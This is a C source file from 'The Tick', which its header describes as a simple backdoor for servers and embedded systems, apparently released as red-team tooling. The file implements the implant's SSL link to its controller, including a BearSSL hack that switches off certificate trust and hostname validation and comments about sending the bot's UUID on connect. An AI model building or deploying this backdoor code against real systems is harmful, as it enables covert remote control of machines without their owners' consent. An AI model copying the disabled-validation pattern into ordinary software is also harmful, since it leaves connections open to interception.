/* 
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <minwindef.h>
#define SHUT_RD SD_RECEIVE
#define SHUT_WR SD_SEND
#define SHUT_RDWR SD_BOTH
#define MIN min
#define MAX max
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/param.h>
#include <errno.h>

#include "bearssl.h"

#include "common.h"
#include "tcp.h"

#include "ssl.h"

/****************************************************************************/

#ifdef _WIN32

// Low-level data read callback for the simplified SSL I/O API.
// Windows version.
static int sock_read(void *ctx, unsigned char *buf, size_t len)
{
    for (;;) {
        int rlen = recv(*(SOCKET *)ctx, (char *) buf, (int) len, 0);
        if (rlen <= 0) {
            if (rlen < 0 && WSAGetLastError() == WSAEINTR) {
                continue;
            }
            return -1;
        }
        return rlen;
    }
}

// Low-level data write callback for the simplified SSL I/O API.
// Windows version.
static int sock_write(void *ctx, const unsigned char *buf, size_t len)
{
    for (;;) {
        int wlen = send(*(SOCKET *)ctx, (char *) buf, (int) len, 0);
        if (wlen <= 0) {
            if (wlen < 0 && WSAGetLastError() == WSAEINTR) {
                continue;
            }
            return -1;
        }
        return wlen;
    }
}

#else

// Low-level data read callback for the simplified SSL I/O API.
// Unix version.
static int sock_read(void *ctx, unsigned char *buf, size_t len)
{
    for (;;) {
        ssize_t rlen;

        rlen = read(*(int *)ctx, buf, len);
        if (rlen <= 0) {
            if (rlen < 0 && errno == EINTR) {
                continue;
            }
            return -1;
        }
        return (int)rlen;
    }
}

// Low-level data write callback for the simplified SSL I/O API.
// Unix version.
static int sock_write(void *ctx, const unsigned char *buf, size_t len)
{
    for (;;) {
        ssize_t wlen;

        wlen = write(*(int *)ctx, buf, len);
        if (wlen <= 0) {
            if (wlen < 0 && errno == EINTR) {
                continue;
            }
            return -1;
        }
        return (int)wlen;
    }
}

#endif

/****************************************************************************/

// BearSSL hack to disable certificate validation.
//
// Adapted from:
// https://clickhouse.tech/codebrowser/html_report/ClickHouse/contrib/curl/lib/vtls/bearssl.c.html
//
// See LICENSE for curl:
// https://curl.haxx.se/docs/copyright.html

static void x509_start_chain(const br_x509_class **ctx,
                             const char *server_name)
{
    x509_context *x509 = (x509_context *) ctx;
    if (!x509->verifyhost) {
        server_name = NULL;
    }
    x509->minimal.vtable->start_chain(&x509->minimal.vtable, server_name);
}

static void x509_start_cert(const br_x509_class **ctx, uint32_t length)
{
    x509_context *x509 = (x509_context *) ctx;
    x509->minimal.vtable->start_cert(&x509->minimal.vtable, length);
}

static void x509_append(const br_x509_class **ctx, const unsigned char *buf,
                        size_t len)
{
    x509_context *x509 = (x509_context *) ctx;
    x509->minimal.vtable->append(&x509->minimal.vtable, buf, len);
}

static void x509_end_cert(const br_x509_class **ctx)
{
    x509_context *x509 = (x509_context *) ctx;
    x509->minimal.vtable->end_cert(&x509->minimal.vtable);
}

static unsigned x509_end_chain(const br_x509_class **ctx)
{
    x509_context *x509 = (x509_context *) ctx;
    unsigned err;
    err = x509->minimal.vtable->end_chain(&x509->minimal.vtable);
    if (err && !x509->verifypeer) {
        err = BR_ERR_OK;
    }
    return err;
}

static const br_x509_pkey *x509_get_pkey(const br_x509_class *const *ctx,
                                         unsigned *usages)
{
    x509_context *x509 = (x509_context *) ctx;
    return x509->minimal.vtable->get_pkey(&x509->minimal.vtable, usages);
}

static const br_x509_class x509_vtable = {
    sizeof(x509_context),
    x509_start_chain,
    x509_start_cert,
    x509_append,
    x509_end_cert,
    x509_end_chain,
    x509_get_pkey
};

/****************************************************************************/

// Connects to the given hostname and port using SSL.
// Writes the socket to the requested address.
// On error returns -1.
int ssl_connect_to_host(SSL_Context *ssl, int *out_fd, const char *hostname, int port)
{
    int err = BR_ERR_OK;

    // Zero out the entire SSL structure.
    memset(ssl, 0, sizeof(SSL_Context));

    // Initialize the SSL context with the full profile.
    // In the future we may want to prepare a custom profile instead,
    // leaving only the specific algorithms we want to use.
    // See: BearSSL/samples/custom_profile.c
    br_ssl_client_init_full(&ssl->sc, &ssl->xc.minimal, 0, 0);

    // Initialize the full duplex buffers.
    // In the future we may want to make the buffer size configurable.
    br_ssl_engine_set_buffer(&ssl->sc.eng, ssl->iobuf, sizeof ssl->iobuf, 1);

    // Disable SSL renegotiation.
    br_ssl_engine_add_flags(&ssl->sc.eng, BR_OPT_NO_RENEGOTIATION);

    // Initialize the X.509 context.
    // This effectively disables certificate validation.
    // In the future we will want to make this optional, with the
    // possibility of doing certificate pinning instead of this.
    ssl->xc.vtable = &x509_vtable;
    ssl->xc.verifypeer = 0;     // disable trust validation
    ssl->xc.verifyhost = 0;     // disable hostname validation
    br_ssl_engine_set_x509(&ssl->sc.eng, &ssl->xc.vtable);

    // Prepare for the client handshake.
    br_ssl_client_reset(&ssl->sc, hostname, 0);

    // The error state at this point should be zero.
    // If there was an error, abort.
    err = br_ssl_engine_last_error(&ssl->sc.eng);
    if (err != BR_ERR_OK) {
        LOG("Error %d setting up SSL library!\n", err);
        memset(ssl, 0, sizeof(SSL_Context));
        return -1;
    }

    // Make a plaintext connection.
    *out_fd = connect_to_host(hostname, port);
    if (*out_fd < 0) {
        return -1;
    }

    // Set the socket read and write callbacks.
    br_sslio_init(&ssl->ioc, &ssl->sc.eng, sock_read, out_fd, sock_write, out_fd);

    // We are ready for the handshake.
    //
    // I could not find a way to force bearssl to send the handshake right now;
    // instead, it will be sent when the first bytes are sent. That means if
    // there is a handshake error we won't find out here but rather when sending
    // the UUID of the bot after connection.
    //
    // This is a slight inconvenience: a handshake error will be trated the same
    // way as a dropped plaintext connection. Ideally I would like to handle the
    // error here, not there.
    //
    // Oh, well. Shikata ga nai. ¯\_(ツ)_/¯

    // Return 0 on success.
    return 0;
}

// Sends a block of data over SSL.
// Does not return until all data has been sent.
// Returns 0 on success or -1 if the connection was interrupted.
int ssl_send_block(SSL_Context *ssl, const char *buf, size_t count)
{
    int success = br_sslio_write_all(&ssl->ioc, buf, count);
    success |= br_sslio_flush(&ssl->ioc);
    return success;
}

// Reads a block of data from SSL.
// Does not return until all data has been read.
// Returns 0 on success or -1 if the connection was interrupted.
int ssl_recv_block(SSL_Context *ssl, char *buf, size_t count)
{
    return br_sslio_read_all(&ssl->ioc, buf, count);
}

// Consume "count" bytes from SSL and discard them.
// Returns 0 on success, or -1 on error.
int ssl_consume_extra_data(SSL_Context *ssl, size_t count)
{
    char buffer[256];
    while (count != 0) {
        ssize_t bytes = br_sslio_read(&ssl->ioc, (void *) &buffer, MIN(sizeof(buffer), count));
        if (bytes <= 0) {
            return -1;
        }
        count = count - (size_t) bytes;
    }
    return 0;
}

// Close an SSL connection in a "nice" way.
void disconnect_ssl(SSL_Context *ssl)
{
    int fd = *((int *) ssl->ioc.read_context);
    if (fd >= 0) {
        br_sslio_close(&ssl->ioc);
        shutdown(fd, SHUT_RD);
        close(fd);
        *((int *) ssl->ioc.read_context) = -1;
    }
}
